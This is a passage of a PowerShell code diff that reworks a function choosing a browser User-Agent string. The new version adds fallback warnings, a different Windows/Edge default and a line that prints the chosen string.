+            } elseif ($Browser -eq 'Safari') {
+                Write-Warning "Device platform not found, defaulting to Safari"
+                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
+            } else {
+                Write-Warning "Device platform not found, defaulting to Windows/Edge"
+                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
             }
-            elseif($Browser -eq 'Safari')
-            {
-                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15' 
-            }
-            else
-            {
-                $UserAgent = $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
-            } 
         }
+        Write-Host ("$UserAgent")
         return $UserAgent
-   }   
+    }
 }
 
 
